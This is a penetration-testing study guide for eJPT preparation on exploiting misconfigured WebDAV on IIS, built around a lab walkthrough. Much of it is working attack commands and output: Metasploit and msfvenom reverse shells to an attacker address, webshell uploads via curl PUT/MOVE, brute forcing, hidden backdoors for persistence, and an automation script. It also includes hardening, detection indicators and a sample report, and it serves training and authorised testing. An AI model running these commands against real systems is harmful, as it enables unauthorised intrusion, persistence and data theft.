# 🌐 Complete WebDAV Exploitation Guide

Comprehensive methodology for exploiting WebDAV (Web Distributed Authoring and Versioning) implementations in penetration testing.

**Location in Framework:** `web-pentesting/file-upload/webdav-exploitation.md`

---

## 🎯 What is WebDAV?

WebDAV (Web Distributed Authoring and Versioning) extends HTTP/1.1 to support distributed web authoring. When misconfigured, it becomes a critical attack vector allowing remote code execution through file upload abuse.

### WebDAV Core Features
- **File Management** - Upload, download, move, copy files
- **Directory Operations** - Create/delete directories
- **Locking Mechanisms** - Prevent concurrent modifications
- **Property Management** - Metadata and attributes
- **Authentication** - User access control

### Exploitation Vectors
- **File Upload Abuse** - Uploading executable files through WebDAV
- **Authentication Bypass** - Exploiting weak or default credentials  
- **Path Traversal** - Accessing restricted directories
- **Method Abuse** - Using dangerous HTTP methods (PUT, DELETE, MKCOL)

---

## 📦 Prerequisites and Tools

### Required Tools
- **nmap** - Service discovery and WebDAV detection
- **davtest** - WebDAV capability testing
- **cadaver** - Interactive WebDAV client  
- **metasploit** - Automated exploitation framework
- **curl** - Manual HTTP requests and verification
- **nikto** - Web vulnerability scanner
- **dirb/dirbuster** - Directory enumeration

### Target Requirements
- WebDAV-enabled web server
- File upload permissions configured
- Executable file types allowed (ASP, ASPX, PHP, JSP)
- Accessible via HTTP/HTTPS

---

## 🔍 Complete Discovery Methodology

### Phase 1: Service Discovery

#### Step 1: Initial Port Scanning
```bash
# Basic port scan
nmap -sV -p 80,443 demo.ine.local

# Comprehensive scan
nmap -sV -p- demo.ine.local
```

#### Step 2: HTTP Service Enumeration
```bash
# HTTP enumeration script detects WebDAV
nmap --script http-enum -sV -p 80 demo.ine.local

# Specific WebDAV scripts
nmap --script http-webdav-scan -p 80,443 target.com

# Check for WebDAV methods
nmap --script http-methods -p 80 target.com
```

**Expected Discovery Output:**
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-enum: 
|   /webdav/: Potentially interesting folder (401 Unauthorized)
```

### Manual WebDAV Detection
```bash
# Check for WebDAV methods
curl -X OPTIONS http://target.com/webdav/

# Look for DAV header
curl -I http://target.com/webdav/
```

**Expected Response:**
```http
HTTP/1.1 200 OK
DAV: 1,2
MS-Author-Via: DAV
Allow: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
```

### Common WebDAV Directory Discovery
```bash
# Common WebDAV directories
/webdav/
/dav/
/uploads/  
/files/
/documents/
/sharepoint/
/exchange/
/_vti_bin/
/msadc/

# Automated directory discovery
dirb http://target.com/ /usr/share/dirb/wordlists/common.txt
nikto -h http://target.com -Cgidirs /webdav/
```

---

## 🧪 Real Lab Exploitation Walkthrough

### Lab: Windows IIS Server WebDAV Metasploit

#### Phase 1: Initial Reconnaissance
```bash
# Target identification
nmap demo.ine.local
```
**Result:** Found ports 80/tcp (http), 135/tcp (msrpc), 139/tcp (netbios-ssn), 445/tcp (microsoft-ds), 3306/tcp (mysql), 3389/tcp (ms-wbt-server)

#### Phase 2: WebDAV Discovery  
```bash
# HTTP enumeration reveals WebDAV
nmap --script http-enum -sV -p 80 demo.ine.local
```
**Discovery Result:**
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-enum: 
|   /webdav/: Potentially interesting folder (401 Unauthorized)
```

#### Phase 3: Access Assessment
```bash
# Test WebDAV without authentication (fails with 401)
davtest -url http://demo.ine.local/webdav

# Test with discovered credentials
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav/
```

**Authentication Results:**
```
# Unauthenticated attempt
OPEN    FAIL:   http://demo.ine.local/webdav   Unauthorized. Basic realm="demo.ine.local"

# Authenticated attempt
OPEN    SUCCEED:    http://demo.ine.local/webdav
```

#### Phase 4: Capability Assessment
```bash
# Comprehensive capability testing
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
```

**Lab Results Analysis:**
```
File Upload Capabilities:
✅ cgi, php, txt, jsp, jhtml, aspx, asp, html, shtml, cfm, pl - SUCCEED

Execution Capabilities:  
❌ cgi, php, jsp, jhtml, aspx, shtml, cfm, pl - FAIL
✅ txt, asp, html - SUCCEED

Critical Finding: ASP files can be uploaded AND executed
```

**Key Findings:**
- ASP files: PUT = SUCCEED, EXEC = SUCCEED
- Authentication required: Basic Auth (bob:password_123321)
- Upload directory permissions: Write enabled

#### Phase 5: Automated Exploitation
```bash
# Launch Metasploit
msfconsole -q

# Configure WebDAV exploit
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS demo.ine.local  
set HttpUsername bob
set HttpPassword password_123321
set PATH /webdav/metasploit%RAND%.asp
exploit
```

**Successful Exploitation Output:**
```
[*] Started reverse TCP handler on 10.10.31.2:4444
[*] Uploading 609542 bytes to /webdav/metasploit159423466.txt...
[*] Moving /webdav/metasploit159423466.txt to /webdav/metasploit159423466.asp...
[*] Executing /webdav/metasploit159423466.asp...
[*] Meterpreter session 1 opened (10.10.31.2:4444 -> 10.0.28.105:49740)

meterpreter >
```

#### Phase 6: Post-Exploitation
```bash
# Meterpreter shell access
shell

# System navigation and flag retrieval
cd /
dir
type flag.txt
```

**Post-Exploitation Results:**
```
Microsoft Windows [Version 10.0.17763.1457]
c:\>type flag.txt
d3aff16a801b4b7d36b4da1094bee345
```

---

## 🔧 WebDAV HTTP Methods and Manual Exploitation

### Core WebDAV Methods
| Method | Purpose | Example Usage |
|--------|---------|---------------|
| **PUT** | Upload file | `curl -X PUT --data-binary @shell.asp http://target/webdav/shell.asp` |
| **GET** | Download file | `curl http://target/webdav/file.txt` |
| **DELETE** | Remove file | `curl -X DELETE http://target/webdav/shell.asp` |
| **MKCOL** | Create directory | `curl -X MKCOL http://target/webdav/newdir/` |
| **COPY** | Copy resource | `curl -X COPY -H "Destination: /webdav/copy.asp" http://target/webdav/shell.asp` |
| **MOVE** | Move/rename | `curl -X MOVE -H "Destination: /webdav/moved.asp" http://target/webdav/shell.asp` |

### Advanced Methods  
| Method | Purpose | Example Usage |
|--------|---------|---------------|
| **PROPFIND** | Get properties | `curl -X PROPFIND http://target/webdav/` |
| **PROPPATCH** | Set properties | Advanced metadata manipulation |
| **LOCK/UNLOCK** | File locking | Prevent concurrent access |
| **OPTIONS** | Discover methods | `curl -X OPTIONS http://target/webdav/` |

### Manual Exploitation with cURL

#### File Upload (PUT Method)
```bash
# Upload webshell directly
curl -X PUT --data-binary @webshell.asp \
  --user bob:password_123321 \
  http://demo.ine.local/webdav/shell.asp

# Upload with authentication header
curl -X PUT --data-binary @shell.php \
  -H "Authorization: Basic Ym9iOnBhc3N3b3JkXzEyMzMyMQ==" \
  http://demo.ine.local/webdav/shell.php
```

#### Manual Webshell Upload with Cadaver
```bash
# Interactive upload using Cadaver
cadaver http://demo.ine.local/webdav
Username: bob
Password: password_123321

dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
```

#### Remote Code Execution
```bash
# Access webshell via browser/curl
curl "http://demo.ine.local/webdav/webshell.asp?cmd=whoami"
curl "http://demo.ine.local/webdav/webshell.asp?cmd=dir+C:\"
```

#### Directory Operations
```bash
# List directory contents
curl -X PROPFIND --user bob:password_123321 \
  http://demo.ine.local/webdav/

# Detailed property information
curl -X PROPFIND --user bob:password_123321 \
  -H "Depth: 1" \
  http://demo.ine.local/webdav/

# Create new directory
curl -X MKCOL --user bob:password_123321 \
  http://demo.ine.local/webdav/uploads/
```

#### File Manipulation
```bash
# Copy file to new location
curl -X COPY --user bob:password_123321 \
  -H "Destination: http://demo.ine.local/webdav/backup.asp" \
  http://demo.ine.local/webdav/shell.asp

# Move file (rename)
curl -X MOVE --user bob:password_123321 \
  -H "Destination: http://demo.ine.local/webdav/hidden.txt" \
  http://demo.ine.local/webdav/shell.asp
```

---

## 🚨 Advanced Attack Vectors

### 1. Credential Attacks

#### Default Credentials Testing
```bash
# Common WebDAV default credentials
admin:admin
admin:password
webdav:webdav
test:test
guest:guest
anonymous:anonymous
```

#### Brute Force Attack
```bash
# Using hydra for WebDAV brute force
hydra -L users.txt -P passwords.txt \
  demo.ine.local http-get /webdav/

# Manual testing with curl
for password in admin password 123456; do
  curl --user admin:$password \
    http://demo.ine.local/webdav/ 2>/dev/null \
    && echo "Success: admin:$password"
done
```

### 2. Directory Traversal Exploitation

#### Path Manipulation Attempts
```bash
# Attempt to upload outside WebDAV directory
curl -X PUT --data-binary @shell.asp \
  --user bob:password_123321 \
  http://demo.ine.local/webdav/../shell.asp

# Try to access system directories
curl -X PROPFIND --user bob:password_123321 \
  http://demo.ine.local/webdav/../../../
```

### 3. File Extension Bypass Techniques

#### IIS-Specific Bypasses
```bash
# Upload as .txt then move to .asp
curl -X PUT --data-binary @shell.asp \
  --user bob:password_123321 \
  http://demo.ine.local/webdav/shell.txt

curl -X MOVE --user bob:password_123321 \
  -H "Destination: /webdav/shell.asp" \
  http://demo.ine.local/webdav/shell.txt
```

#### Alternative Extensions for IIS
```bash
# Try various ASP extensions
for ext in asp asa cer aspx; do
  curl -X PUT --data-binary @webshell.asp \
    --user bob:password_123321 \
    http://demo.ine.local/webdav/shell.$ext
done
```

### 4. Authentication Bypass Techniques
```bash
# Test for anonymous write access
curl -X PUT --data-binary @test.txt http://target.com/webdav/test.txt

# Try different authentication methods
curl -X OPTIONS --user lowpriv:password http://target.com/webdav/

# Check for dangerous method exposure without authentication
curl -X OPTIONS http://target.com/webdav/
```

---

## 🎯 Post-Exploitation Activities

### System Reconnaissance
```bash
# Execute commands via uploaded webshell
curl "http://demo.ine.local/webdav/shell.asp?cmd=whoami"
curl "http://demo.ine.local/webdav/shell.asp?cmd=hostname"  
curl "http://demo.ine.local/webdav/shell.asp?cmd=systeminfo"
curl "http://demo.ine.local/webdav/shell.asp?cmd=ipconfig"
```

### Privilege Escalation Assessment
```bash
# Check current privileges  
curl "http://demo.ine.local/webdav/shell.asp?cmd=whoami+/priv"

# Look for local users
curl "http://demo.ine.local/webdav/shell.asp?cmd=net+users"

# Check system information
curl "http://demo.ine.local/webdav/shell.asp?cmd=systeminfo"

# Look for installed software
curl "http://demo.ine.local/webdav/shell.asp?cmd=wmic+product+get+name"
```

### Persistence Mechanisms
```bash
# Upload additional backdoors
curl -X PUT --data-binary @backdoor.asp \
  --user bob:password_123321 \
  http://demo.ine.local/webdav/maintenance.asp

# Hide files in subdirectories
curl -X MKCOL --user bob:password_123321 \
  http://demo.ine.local/webdav/logs/
curl -X PUT --data-binary @persistent.asp \
  --user bob:password_123321 \
  http://demo.ine.local/webdav/logs/update.asp
```

---

## 🔧 Tool Integration and Automation

### Metasploit WebDAV Modules
```bash
# WebDAV scanner
use auxiliary/scanner/http/webdav_scanner
set RHOSTS target.com
run

# WebDAV upload exploit
use exploit/windows/iis/iis_webdav_upload_asp  
set RHOSTS demo.ine.local
set HttpUsername bob
set HttpPassword password_123321
run

# Alternative payloads
show payloads
set payload windows/shell/reverse_tcp
set payload windows/meterpreter/reverse_tcp
```

### Manual Payload Generation
```bash
# Create custom webshell payload
msfvenom -p windows/shell_reverse_tcp LHOST=[attacker_ip] LPORT=4444 -f asp > shell.asp

# Manual upload with curl
curl -X PUT -T shell.asp -u bob:password_123321 http://demo.ine.local/webdav/shell.asp

# Execute payload
curl http://demo.ine.local/webdav/shell.asp
```

### Custom Automation Scripts
```bash
#!/bin/bash
# WebDAV exploitation automation script
TARGET="http://demo.ine.local/webdav/"
USER="bob:password_123321"

echo "[+] Testing WebDAV connectivity..."
if curl -s --user $USER -X OPTIONS $TARGET | grep -q "DAV"; then
    echo "[+] WebDAV confirmed"
    
    echo "[+] Uploading webshell..."
    curl -X PUT --data-binary @webshell.asp --user $USER "${TARGET}shell.asp"
    
    echo "[+] Testing execution..."
    curl "${TARGET}shell.asp?cmd=whoami"
    
    echo "[+] Creating persistence..."
    curl -X MKCOL --user $USER "${TARGET}backup/"
    curl -X PUT --data-binary @webshell.asp --user $USER "${TARGET}backup/update.asp"
else
    echo "[-] WebDAV not accessible"
fi
```

---

## ⚠️ Common Misconfigurations and Issues

### Dangerous WebDAV Configurations
1. **Anonymous Access Enabled**
2. **Insufficient Access Controls**
3. **Dangerous Method Exposure** (PUT, DELETE, MOVE, COPY)
4. **Executable File Types Allowed**
5. **Weak Authentication Mechanisms**

### Troubleshooting Common Issues

#### Issue 1: WebDAV Not Detected
```bash
# Problem: Nmap doesn't find WebDAV directories
# Solution: Use comprehensive enumeration
nmap --script "http-*" -p 80 target
dirb http://target/ /usr/share/dirb/wordlists/common.txt
gobuster dir -u http://target/ -w /usr/share/wordlists/common.txt
```

#### Issue 2: Authentication Failures
```bash
# Problem: davtest returns 401/403 errors
# Solution: Verify credentials and try different formats
davtest -auth domain\\user:pass -url http://target/webdav
davtest -auth user%40domain.com:pass -url http://target/webdav
```

#### Issue 3: File Upload Restrictions
```bash
# Problem: No file types can be uploaded
# Solution: Check server configuration and try different endpoints
nmap --script http-methods --script-args http-methods.test-all -p 80 target
```

#### Issue 4: Metasploit Payload Failure
```bash
# Problem: Payload uploads but doesn't execute
# Solution: Verify execution capabilities and try different payloads
show payloads
set payload windows/shell/reverse_tcp
set payload linux/x86/shell/reverse_tcp
```

---

## 🎯 eJPT Exam Focus Points

### Essential Skills for eJPT
1. **WebDAV Discovery** - Using Nmap scripts and manual detection
2. **Authentication Testing** - Default/weak credential assessment
3. **Capability Assessment** - Using davtest for upload/execution testing
4. **Exploitation Execution** - Metasploit and manual exploitation methods
5. **Post-Exploitation** - System access and evidence collection

### Key Commands to Remember
```bash
# Discovery
nmap --script http-enum -p 80 target.com
nmap --script http-webdav-scan -p 80 target.com

# Capability testing
davtest -auth user:pass -url http://target.com/webdav/

# Manual file upload
curl -X PUT --data-binary @shell.asp --user user:pass http://target.com/webdav/shell.asp

# Interactive client
cadaver http://target.com/webdav/

# Metasploit exploitation
use exploit/windows/iis/iis_webdav_upload_asp
```

### Common Exam Scenarios
- **IIS Server with WebDAV** (like the lab example)
- **Apache Server with mod_dav** configuration
- **Misconfigured SharePoint WebDAV** access
- **Cloud Storage with WebDAV** interface

---

## 🛡️ Defensive Considerations

### Secure WebDAV Configuration
1. **Disable Unnecessary HTTP Methods** - Remove PUT, DELETE, MKCOL if not needed
2. **Implement Strong Authentication** - Avoid Basic Auth, use NTLM or Digest
3. **Use SSL/TLS Encryption** - Secure all WebDAV communications
4. **Restrict Directory Access** - Implement proper file system permissions
5. **Enable Comprehensive Logging** - Monitor all WebDAV activities
6. **File Type Restrictions** - Block executable file uploads
7. **Rate Limiting** - Prevent brute force attacks

### Detection Indicators
- Multiple PUT/DELETE requests in short timeframe
- Unusual file uploads (.asp, .php files to non-development servers)
- Authentication attempts on WebDAV endpoints
- Directory traversal attempts in WebDAV paths
- Suspicious user-agent strings
- Large file uploads outside business hours

---

## 📝 Documentation and Reporting

### Evidence Collection Framework
1. **Discovery Evidence**
   - Nmap scan results showing WebDAV detection
   - Screenshots of HTTP responses with DAV headers
   - Directory enumeration results

2. **Vulnerability Assessment**
   - davtest output showing upload/execution capabilities
   - Authentication testing results
   - Method enumeration findings

3. **Exploitation Proof**
   - Metasploit session establishment logs
   - Manual exploitation command sequences
   - Webshell upload verification

4. **Post-Exploitation Evidence**
   - System access screenshots
   - Command execution results
   - Flag or sensitive data retrieval

### Professional Risk Assessment
```
WebDAV Vulnerability Assessment Report:

Executive Summary:
Critical WebDAV misconfiguration allows unauthorized file upload and remote 
code execution, resulting in complete server compromise.

Technical Details:
- Server: Microsoft IIS httpd 10.0
- WebDAV Path: /webdav/
- Authentication: Weak Basic authentication (bob:password_123321)
- Vulnerability: File upload with ASP execution capability
- Impact: Remote code execution with SYSTEM privileges

Attack Chain:
1. Service Discovery: Nmap enumeration revealed WebDAV service
2. Authentication: Weak credentials identified and exploited
3. Capability Assessment: ASP file upload and execution confirmed
4. Exploitation: Metasploit iis_webdav_upload_asp module successful
5. Post-Exploitation: SYSTEM access achieved, sensitive data accessed

Business Impact:
- Severity: CRITICAL
- Confidentiality: Complete compromise - full file system access
- Integrity: System files can be modified or replaced
- Availability: Service disruption through file manipulation
- Compliance: Potential regulatory violations due to data exposure

Remediation Priority: IMMEDIATE
- Disable WebDAV service if not required for business operations
- Implement strong authentication mechanisms (certificate-based preferred)
- Restrict file upload types and execution permissions
- Enable comprehensive access controls and monitoring
- Deploy intrusion detection for WebDAV activities

Evidence References:
- Flag Retrieved: d3aff16a801b4b7d36b4da1094bee345
- Exploitation Timestamp: [Include actual timestamps]
- Network Traffic Captures: [Reference PCAP files]
- System Access Logs: [Reference log entries]
```

### Impact Assessment Matrix
| Asset | Confidentiality | Integrity | Availability | Overall Risk |
|-------|----------------|-----------|--------------|--------------|
| Web Server | HIGH | HIGH | MEDIUM | CRITICAL |
| Application Data | HIGH | HIGH | LOW | HIGH |
| User Data | HIGH | MEDIUM | LOW | HIGH |
| System Files | HIGH | HIGH | HIGH | CRITICAL |

---

## 🔗 Integration with Overall Penetration Testing

### Pre-WebDAV Assessment Chain
```bash
# Network Discovery
nmap -sn [network_range]

# Comprehensive Port Scanning
nmap -sV -sC -p- [target]

# Web Application Discovery
nmap --script "http-*" -p 80,443 [target]
nikto -h http://[target]
```

### WebDAV-Specific Assessment
```bash
# WebDAV Detection
nmap --script http-enum,http-webdav-scan -p 80 [target]

# Capability Testing
davtest -url http://[target]/webdav
davtest -auth [credentials] -url http://[target]/webdav

# Manual Verification
curl -X OPTIONS http://[target]/webdav/
```

### Post-WebDAV Exploitation Chain
```bash
# In Meterpreter session
# Privilege Escalation
use post/multi/recon/local_exploit_suggester
run

# Persistence
use exploit/windows/local/persistence_service
run

# Lateral Movement
use post/windows/gather/enum_shares
use auxiliary/scanner/smb/smb_login

# Data Exfiltration
download c:\\flag.txt
download c:\\important_data\\
```

### Advanced Persistence Techniques
```bash
# Multiple backdoor deployment
curl -X PUT --data-binary @backdoor1.asp --user bob:password_123321 http://demo.ine.local/webdav/system.asp
curl -X PUT --data-binary @backdoor2.asp --user bob:password_123321 http://demo.ine.local/webdav/admin.asp

# Hidden directory creation
curl -X MKCOL --user bob:password_123321 http://demo.ine.local/webdav/.hidden/
curl -X PUT --data-binary @persistent.asp --user bob:password_123321 http://demo.ine.local/webdav/.hidden/update.asp
```

---

## 📚 Additional Resources and References

### WebDAV Security Resources
- **RFC 4918** - HTTP Extensions for Web Distributed Authoring and Versioning (WebDAV)
- **OWASP WebDAV Testing Guide** - Comprehensive security testing methodology
- **Microsoft IIS WebDAV Security** - Platform-specific security considerations
- **Apache mod_dav Documentation** - Apache WebDAV module security

### Tools and Frameworks
- **davtest** - WebDAV capability assessment tool
- **cadaver** - Command-line WebDAV client
- **Metasploit Framework** - Automated exploitation platform
- **Burp Suite** - Web application security testing
- **OWASP ZAP** - Open-source web application scanner

### Training and Certification
- **eJPT (eLearnSecurity Junior Penetration Tester)** - Entry-level certification
- **OSCP (Offensive Security Certified Professional)** - Advanced penetration testing
- **CEH (Certified Ethical Hacker)** - Ethical hacking certification
- **SANS GPEN** - GIAC Penetration Tester certification

This comprehensive guide provides complete coverage of WebDAV exploitation techniques, from discovery through post-exploitation, suitable for both eJPT exam preparation and real-world penetration testing scenarios.
